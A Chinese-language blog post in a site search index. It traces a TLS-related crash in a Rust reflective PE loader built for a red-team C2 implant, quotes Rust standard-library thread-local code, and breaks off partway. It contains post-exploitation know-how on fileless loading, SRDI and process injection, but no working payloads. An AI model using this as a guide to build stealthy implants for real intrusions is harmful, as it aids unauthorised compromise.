<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>从一个崩溃开始的PE Loader 救赎之旅</title>
    <link href="/2024/12/31/%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%B4%A9%E6%BA%83%E5%BC%80%E5%A7%8B%E7%9A%84PE-Loader-%E6%95%91%E8%B5%8E%E4%B9%8B%E6%97%85/"/>
    <url>/2024/12/31/%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%B4%A9%E6%BA%83%E5%BC%80%E5%A7%8B%E7%9A%84PE-Loader-%E6%95%91%E8%B5%8E%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<h2 id="从一个崩溃开始的-PE-Loader-救赎之旅"><a href="#从一个崩溃开始的-PE-Loader-救赎之旅" class="headerlink" title="从一个崩溃开始的 PE Loader 救赎之旅"></a>从一个崩溃开始的 PE Loader 救赎之旅</h2><blockquote><p>如果读者已经熟知PE加载， 那么本文的内容将不会有非常大的革新， 但各位阅读完本文可能也会看到一些新鲜玩意， 聊以慰籍 :)</p><p>今年8月， 我们推出了下一代 <code>C2</code> 计划 – <code>Internal of Malice</code> , 旨在实现一套 <code>post-exploit</code> 基础设施， 在<code>implant</code>的语言选用中， 我们尝试了这两年最火热的红队语言：<code>Rust</code>, 也因为这个选择，在实现过程中遇到了和解决了非常多有意思的问题。</p><p>在推出<code>stager</code> 版本之后， 交流群的一位同学贴出了<a href="https://landaire.net/reflective-pe-loader-for-xbox/">Writing a PE Loader for the Xbox in 2024</a> 这篇文章， 用一种非常粗暴的方式解决了 <code>Rust</code>在使用<code>MSVC</code>编译时引入了<code>TLS(thread-local storage)</code>  , 而只常见的<code>PELoader</code> 简单调用 <code>tls callback</code> 无法正常加载 <code>PE</code> 文件的问题， 遂成文。</p></blockquote><h2 id="从-Implant-的设计理念说起"><a href="#从-Implant-的设计理念说起" class="headerlink" title="从 Implant 的设计理念说起"></a>从 Implant 的设计理念说起</h2><p>在设计之初， <code>implant</code> 就是一个由各种可替换组件构成的 <code>星舰</code>， 一个涵盖了多种无文件攻击模块(以<code>Windows</code>平台举例的<code>Shellcode</code>, <code>PE</code>, <code>.Net</code>, <code>Powershell</code>, <code>BOF</code>) 的可组装载体， 它应该是一个可以承载各种格式的 <code>payload</code> 发射器，或者作为一个安静的流量代理工具， 因此对于 <code>implant</code> 而言， 各种动态加载的功能必不可少， 而在 <code>windows</code> 中， <code>LoadPE</code> 就是实现这个想法的一个最基本的功能</p><p>在开始之前， 我们还是先简单介绍一下<code>LoadPE</code>, 在一个 <code>LoadPE</code> 的常规流程中， 有着如下几个常规动作</p><ul><li>解析 <code>PE</code> 头</li><li>映射节区</li><li>修复重定位表</li><li>修复导入表</li><li>修复延迟导入表</li><li>修复权限</li><li>调用 <code>TLS callback</code> 函数</li><li>添加异常处理函数</li><li>调用入口点（可选）</li></ul><p>在大部分情况下， 这样的一套流程下来可以涵盖基本的 <code>PE</code> 文件加载了， 但凡事总有例外</p><h2 id="从一个Panic说起"><a href="#从一个Panic说起" class="headerlink" title="从一个Panic说起"></a>从一个Panic说起</h2><h3 id="第一次擦肩"><a href="#第一次擦肩" class="headerlink" title="第一次擦肩"></a>第一次擦肩</h3><p>在初期测试中， 我们动态加载 <code>Modules(IOM的组件)</code> 这一功能在单元测试中运行的十分良好， 但随着功能的逐渐增多， 在 <code>netstat module</code>  的测试中， <code>implant</code> 突然崩溃,  当时的崩溃点位于 <code>tokio</code> （一个<code>Rust</code>的异步运行时库）的 <code>TLS</code> 处理代码中， 随后我简单翻阅了下 <code>tokio</code> 库的 <code>issues</code>, 发现有人提及在<code>windows</code> 中 <code>tokio</code>的 <code>TLS</code> 实现略有问题，因此我将该库替换成了<code>async-std</code>库，这个问题就消失了， 由于当时正处于 <code>implant</code> 功能的快速开发周期， 因此在将原因简单归结于 <code>tokio</code> 库本身的问题后将其暂时搁置， 与核心问题擦肩而过</p><h3 id="再相遇"><a href="#再相遇" class="headerlink" title="再相遇"></a>再相遇</h3><p>再次相遇就是实现 <code>SRDI</code> 功能了， 与第一次擦肩极为类似， 在正常 <code>SRDI</code> 我们的 <code>Beacon</code> 后， 将其注入到 <code>Notepad</code> 进程上线流程十分丝滑</p><p>但在某一次测试时发现， 在将其 <code>inline</code> 执行在我们自身进程时， 熟悉的 <code>panic</code> 再次出现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">thread <span class="hljs-string">&#x27;&lt;unnamed&gt;&#x27;</span> panicked at library\std\src\thread\local.rs:260:26:<br>cannot access a Thread Local Storage value during or after destruction: AccessError<br></code></pre></td></tr></table></figure><p>此时我意识到， 当初 <code>tokio</code> 好像被我冤枉了，死在了我的大意与麻木不仁中， 好在核心功能的开发基本结束， 终于有了空余时间来让我们看看到底发生了什么， 为 <code>tokio</code> 伸冤</p><blockquote><p>由于原理类似，因此这里用 <code>SRDI</code> 还是 <code>InlinePE</code> 区别不大</p></blockquote><p>首先排除库本身的问题， 我编译了一个 <code>DLL</code> 格式的<code>beacon</code>， 通过系统的 <code>LoadLibrary</code> 来进行加载并调用， 丝滑上线</p><p>好的， 这里就可以确定是我们 <code>Load</code> 的时候一定少处理了哪些东西， 一定是 <code>TLS</code>的问题吗</p><p>为了精确到 <code>TLS</code> ， 随后我尝试使用 <code>GNU</code> 编译链来进行测试。 编译， <code>inline</code> 执行， 完美上线， 切回 <code>MSVC</code>， <code>panic</code></p><p>好的， 至此， 我们将范围收缩到了 <code>TLS</code>本身处理上， 让我们追根溯源</p><h3 id="回归TLS"><a href="#回归TLS" class="headerlink" title="回归TLS"></a>回归TLS</h3><p>如果从头讲起， 本篇文章的篇幅将过于发散且庞大， 因此现在将我们的目光收束在<code>TLS</code> 本身上， 当然， 这里我也会简要对其做一个介绍， 相信感兴趣的同学会自己找到某些流传的第三方文档的， 为避免概念性的内容大量占用本文篇幅，推荐各位直接阅读 <a href="http://www.nynaeve.net/?p=180">Ken Johnson</a> 关于 <code>TLS</code> 的精彩分析</p><p>简单来说， <code>TLS</code>  可以允许人们按线程进行存储， 比如在全局变量按线程实例化时, 而在 <code>windows</code> 中， 有一个线程相关的结构体 <code>TEB（Thread Environment Block)</code>， 该结构体会记录和控制很多线程相关的上下文， 我们本篇的重点也自然记录于此</p><p>在 <code>windows</code> 中， 有两种使用 <code>TLS</code> 的方式， 显式调用和隐式， 显式调用即大家熟悉的使用 <code>TlsGetValue</code> 等 <code>k32</code> 的 <code>apis</code>, 而隐式调用即是本篇的重点工程， 即在使用<code>MSVC</code>（这也是为什么上一章我选用GNU来简单聚焦的原因）构建时， 用<code>_declspec(thread)</code>来标记变量</p><p>现在让我们以 <code>rust</code> 的线程代码为例(<code>rustc version &gt;= 1.82.0</code>)</p><blockquote><p>为了收束篇幅， 下面将以64位windows系统为例， 并忽略大部分不必关注的代码</p></blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// https://github.com/rust-lang/rust/blob/f2b91ccbc27cb06369aa2dd934ff219e156408a8/library/std/src/thread/current.rs</span><br><span class="hljs-keyword">use</span> crate::sys::thread_local::local_pointer;<br><br>...<br><br>local_pointer! &#123;<br>    <span class="hljs-keyword">static</span> CURRENT;<br>&#125;<br><br>...<br><span class="hljs-comment">// 为简化代码， 这里我们省略掉大部分目标系统(16, 32位)</span><br>local_pointer! &#123;<br>    <span class="hljs-keyword">static</span> ID;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>而进入 <code>windows</code> 的 <code>thread_local</code> 中， 我们可以看到， </p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Rust"><span class="hljs-comment">// </span><br><span class="hljs-meta">#[macro_export]</span><br><span class="hljs-meta">#[stable(feature = <span class="hljs-string">&quot;rust1&quot;</span>, since = <span class="hljs-string">&quot;1.0.0&quot;</span>)]</span><br><span class="hljs-meta">#[cfg_attr(not(test), rustc_diagnostic_item = <span class="hljs-string">&quot;thread_local_macro&quot;</span>)]</span><br><span class="hljs-meta">#[allow_internal_unstable(thread_local_internals)]</span><br><span class="hljs-built_in">macro_rules!</span> thread_local &#123;<br>....<br><br>    <span class="hljs-comment">// handle a single declaration</span><br>    ($(<span class="hljs-meta">#[$attr:meta]</span>)* $vis:vis <span class="hljs-keyword">static</span> $name:ident: $t:ty = $init:expr) =&gt; (<br>        $crate::thread::local_impl::thread_local_inner!($(<span class="hljs-meta">#[$attr]</span>)* $vis $name, $t, $init);<br>    );<br>&#125;<br></code></pre></td></tr></table></figure><p>即</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs Rust"><span class="hljs-comment">// https://github.com/rust-lang/rust/blob/f2b91ccbc27cb06369aa2dd934ff219e156408a8/library/std/src/sys/thread_local/os.rs#L16</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">macro</span> thread_local_inner &#123;<br>    <span class="hljs-comment">// used to generate the `LocalKey` value for const-initialized thread locals</span><br>    (@key $t:ty, <span class="hljs-keyword">const</span> $init:expr) =&gt; &#123;<br>        $crate::thread::local_impl::thread_local_inner!(@key $t, &#123; <span class="hljs-keyword">const</span> INIT_EXPR: $t = $init; INIT_EXPR &#125;)<br>    &#125;,<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> we cannot import `Storage` or `LocalKey` with a `use` because that can shadow user</span><br>    <span class="hljs-comment">// provided type or type alias with a matching name. Please update the shadowing test in</span><br>    <span class="hljs-comment">// `tests/thread.rs` if these types are renamed.</span><br><br>    <span class="hljs-comment">// used to generate the `LocalKey` value for `thread_local!`.</span><br>    (@key $t:ty, $init:expr) =&gt; &#123;&#123;<br>        <span class="hljs-meta">#[inline]</span><br>        <span class="hljs-keyword">fn</span> <span class="hljs-title function_">__init</span>() <span class="hljs-punctuation">-&gt;</span> $t &#123; $init &#125;<br><br>        <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> this cannot import `LocalKey` or `Storage` with a `use` because that can shadow</span><br>        <span class="hljs-comment">// user provided type or type alias with a matching name. Please update the shadowing test</span><br>        <span class="hljs-comment">// in `tests/thread.rs` if these types are renamed.</span><br>        <span class="hljs-keyword">unsafe</span> &#123;<br>            <span class="hljs-comment">// Inlining does not work on windows-gnu due to linking errors around</span><br>            <span class="hljs-comment">// dllimports. See https://github.com/rust-lang/rust/issues/109797.</span><br>            $crate::thread::LocalKey::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-meta">#[cfg_attr(windows, inline(never))]</span> |init| &#123;<br>                <span class="hljs-keyword">static</span> VAL: $crate::thread::local_impl::Storage&lt;$t&gt;<br>                    = $crate::thread::local_impl::Storage::<span class="hljs-title function_ invoke__">new</span>();<br>                VAL.<span class="hljs-title function_ invoke__">get</span>(init, __init)<br>            &#125;)<br>        &#125;<br>    &#125;&#125;,<br>    ($(<span class="hljs-meta">#[$attr:meta]</span>)* $vis:vis $name:ident, $t:ty, $($init:tt)*) =&gt; &#123;<br>        $(<span class="hljs-meta">#[$attr]</span>)* $vis <span class="hljs-keyword">const</span> $name: $crate::thread::LocalKey&lt;$t&gt; =<br>            $crate::thread::local_impl::thread_local_inner!(@key $t, $($init)*);<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[allow(missing_debug_implementations)]</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Storage</span>&lt;T&gt; &#123;<br>    key: LazyKey,<br>    marker: PhantomData&lt;Cell&lt;T&gt;&gt;,<br>&#125;<br><br><span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">impl</span>&lt;T&gt; <span class="hljs-built_in">Sync</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Storage</span>&lt;T&gt; &#123;&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Value</span>&lt;T: <span class="hljs-symbol">&#x27;static</span>&gt; &#123;<br>    value: T,<br>    <span class="hljs-comment">// INVARIANT: if this value is stored under a TLS key, `key` must be that `key`.</span><br>    key: Key,<br>&#125;<br><br><span class="hljs-keyword">impl</span>&lt;T: <span class="hljs-symbol">&#x27;static</span>&gt; Storage&lt;T&gt; &#123;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>() <span class="hljs-punctuation">-&gt;</span> Storage&lt;T&gt; &#123;<br>        Storage &#123; key: LazyKey::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-title function_ invoke__">Some</span>(destroy_value::&lt;T&gt;)), marker: PhantomData &#125;<br>    &#125;<br>    ...<br></code></pre></td></tr></table></figure><p>聚焦到 <code>windows</code> 中， 就是如下的代码了</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs Rust"><span class="hljs-comment">// https://github.com/rust-lang/rust/blob/f2b91ccbc27cb06369aa2dd934ff219e156408a8/library/std/src/sys/thread_local/key/windows.rs</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LazyKey</span> &#123;<br>    <span class="hljs-comment">/// The key value shifted up by one. Since TLS_OUT_OF_INDEXES == u32::MAX</span><br>    <span class="hljs-comment">/// is not a valid key value, this allows us to use zero as sentinel value</span><br>    <span class="hljs-comment">/// without risking overflow.</span><br>    key: AtomicU32,<br>    dtor: <span class="hljs-type">Option</span>&lt;Dtor&gt;,<br>    next: AtomicPtr&lt;LazyKey&gt;,<br>    <span class="hljs-comment">/// Currently, destructors cannot be unregistered, so we cannot use racy</span><br>    <span class="hljs-comment">/// initialization for keys. Instead, we need synchronize initialization.</span><br>    <span class="hljs-comment">/// Use the Windows-provided `Once` since it does not require TLS.</span><br>    once: UnsafeCell&lt;c::INIT_ONCE&gt;,<br>&#125;<br><br><br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">LazyKey</span> &#123;<br>    <span class="hljs-meta">#[inline]</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(dtor: <span class="hljs-type">Option</span>&lt;Dtor&gt;) <span class="hljs-punctuation">-&gt;</span> LazyKey &#123;<br>        LazyKey &#123;<br>            key: AtomicU32::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">0</span>),<br>            dtor,<br>            next: AtomicPtr::<span class="hljs-title function_ invoke__">new</span>(ptr::<span class="hljs-title function_ invoke__">null_mut</span>()),<br>            once: UnsafeCell::<span class="hljs-title function_ invoke__">new</span>(c::INIT_ONCE_STATIC_INIT),<br>        &#125;<br>    &#125;<br>...<br><br>    <span class="hljs-meta">#[cold]</span><br>    <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">init</span>(&amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> Key &#123;<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.dtor.<span class="hljs-title function_ invoke__">is_some</span>() &#123;<br>            <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">pending</span> = c::FALSE;<br>...<br><br>            <span class="hljs-keyword">if</span> pending == c::FALSE &#123;<br>                <span class="hljs-comment">// Some other thread initialized the key, load it.</span><br>                <span class="hljs-keyword">self</span>.key.<span class="hljs-title function_ invoke__">load</span>(Relaxed) - <span class="hljs-number">1</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">let</span> <span class="hljs-variable">key</span> = <span class="hljs-keyword">unsafe</span> &#123; c::<span class="hljs-title function_ invoke__">TlsAlloc</span>() &#125;;<br>            ...<br><br>                key<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// If there is no destructor to clean up, we can use racy initialization.</span><br><br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">key</span> = <span class="hljs-keyword">unsafe</span> &#123; c::<span class="hljs-title function_ invoke__">TlsAlloc</span>() &#125;;<br>...<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>虽然我们在 <code>init</code>函数中看到了熟悉的 <code>TlsAlloc</code>， <code>TlsFree</code>， 但由于被注册为了 <code>#[cold]</code> 函数， 因此我们大部分情况下都该忽视该实现， 只需要关注 <code>new</code> 函数即可</p><p>那么 <code>key</code> 就是通过原子操作进行定义的 <code>AtomicU32::new()</code></p><p>除此之外， 为了解决<code>tls</code>的析构函数问题， <code>rust</code> 注册了一个 <code>tls callback</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// https://github.com/rust-lang/rust/blob/master/library/std/src/sys/thread_local/guard/windows.rs</span><br><span class="hljs-meta">#[link_section = <span class="hljs-string">&quot;.CRT$XLB&quot;</span>]</span><br><span class="hljs-meta">#[cfg_attr(miri, used)]</span> <span class="hljs-comment">// Miri only considers explicitly `#[used]` statics for `lookup_link_section`</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">static</span> CALLBACK: <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;system&quot;</span> <span class="hljs-title function_ invoke__">fn</span>(*<span class="hljs-keyword">mut</span> c_void, <span class="hljs-type">u32</span>, *<span class="hljs-keyword">mut</span> c_void) = tls_callback;<br><br><span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;system&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">tls_callback</span>(_h: *<span class="hljs-keyword">mut</span> c_void, dw_reason: <span class="hljs-type">u32</span>, _pv: *<span class="hljs-keyword">mut</span> c_void) &#123;<br>    <span class="hljs-keyword">if</span> dw_reason == c::DLL_THREAD_DETACH || dw_reason == c::DLL_PROCESS_DETACH &#123;<br>        <span class="hljs-keyword">unsafe</span> &#123;<br>            <span class="hljs-meta">#[cfg(target_thread_local)]</span><br>            super::super::destructors::<span class="hljs-title function_ invoke__">run</span>();<br>            <span class="hljs-meta">#[cfg(not(target_thread_local))]</span><br>            super::super::key::<span class="hljs-title function_ invoke__">run_dtors</span>();<br><br>            crate::rt::<span class="hljs-title function_ invoke__">thread_cleanup</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这也可以解释为什么简单的 <code>hello world</code> 函数也会含有一个 <code>tls_callback</code> 函数了</p><p>在使用<code>target_thread_local</code>时， 其析构函数为</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">run</span>() &#123;<br>    <span class="hljs-keyword">loop</span> &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">dtors</span> = DTORS.<span class="hljs-title function_ invoke__">borrow_mut</span>();<br>        <span class="hljs-keyword">match</span> dtors.<span class="hljs-title function_ invoke__">pop</span>() &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>((t, dtor)) =&gt; &#123;<br>                <span class="hljs-title function_ invoke__">drop</span>(dtors);<br>                <span class="hljs-keyword">unsafe</span> &#123;<br>                    <span class="hljs-title function_ invoke__">dtor</span>(t);<br>                &#125;<br>            &#125;<br>            <span class="hljs-literal">None</span> =&gt; &#123;<br>                <span class="hljs-comment">// Free the list memory.</span><br>                *dtors = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而在不使用 <code>target_thread_local</code> 时， 其析构函数为</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// This will and must only be run by the destructor callback in [`guard`].</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">run_dtors</span>() &#123;<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..<span class="hljs-number">5</span> &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">any_run</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-comment">// Use acquire ordering to observe key initialization.</span><br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cur</span> = DTORS.<span class="hljs-title function_ invoke__">load</span>(Acquire);<br>        <span class="hljs-keyword">while</span> !cur.<span class="hljs-title function_ invoke__">is_null</span>() &#123;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">pre_key</span> = <span class="hljs-keyword">unsafe</span> &#123; (*cur).key.<span class="hljs-title function_ invoke__">load</span>(Acquire) &#125;;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">dtor</span> = <span class="hljs-keyword">unsafe</span> &#123; (*cur).dtor.<span class="hljs-title function_ invoke__">unwrap</span>() &#125;;<br>            cur = <span class="hljs-keyword">unsafe</span> &#123; (*cur).next.<span class="hljs-title function_ invoke__">load</span>(Relaxed) &#125;;<br><br>            <span class="hljs-comment">// In LazyKey::init, we register the dtor before setting `key`.</span><br>            <span class="hljs-comment">// So if one thread&#x27;s `run_dtors` races with another thread executing `init` on the same</span><br>            <span class="hljs-comment">// `LazyKey`, we can encounter a key of 0 here. That means this key was never</span><br>            <span class="hljs-comment">// initialized in this thread so we can safely skip it.</span><br>            <span class="hljs-keyword">if</span> pre_key == <span class="hljs-number">0</span> &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-comment">// If this is non-zero, then via the `Acquire` load above we synchronized with</span><br>            <span class="hljs-comment">// everything relevant for this key. (It&#x27;s not clear that this is needed, since the</span><br>            <span class="hljs-comment">// release-acquire pair on DTORS also establishes synchronization, but better safe than</span><br>            <span class="hljs-comment">// sorry.)</span><br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">key</span> = pre_key - <span class="hljs-number">1</span>;<br><br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">ptr</span> = <span class="hljs-keyword">unsafe</span> &#123; c::<span class="hljs-title function_ invoke__">TlsGetValue</span>(key) &#125;;<br>            <span class="hljs-keyword">if</span> !ptr.<span class="hljs-title function_ invoke__">is_null</span>() &#123;<br>                <span class="hljs-keyword">unsafe</span> &#123;<br>                    c::<span class="hljs-title function_ invoke__">TlsSetValue</span>(key, ptr::<span class="hljs-title function_ invoke__">null_mut</span>());<br>                    <span class="hljs-title function_ invoke__">dtor</span>(ptr <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> _);<br>                    any_run = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> !any_run &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是说， 如果不使用 <code>target_thread_local</code>, 我们依旧是使用 <code>Tls*</code> 系列函数进行管理</p><p>看到这里， 应该已经可以暂时将所谓的 <code>target_thread_local</code> 和隐式调用挂等号了</p><p>由于单纯的代码并不能完整的构成<code>TLS</code>的构造， 其应该是代码， 编译器和操作系统共同努力的结果， 因此接下来我们需要看看编译后的结果</p><h3 id="hello-world-：）"><a href="#hello-world-：）" class="headerlink" title="hello world ：）"></a>hello world ：）</h3><p>首先让我们用 <code>msvc</code> 编译一个简单的<code>hello world</code> 示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">cargo new hello_world<br><br><span class="hljs-built_in">cd</span> hello_world<br><br>cargo build --target x86_64-pc-windows-msvc<br></code></pre></td></tr></table></figure><p>首先是导入表, 非常干净， 没有 <code>Tls</code> 相关函数</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 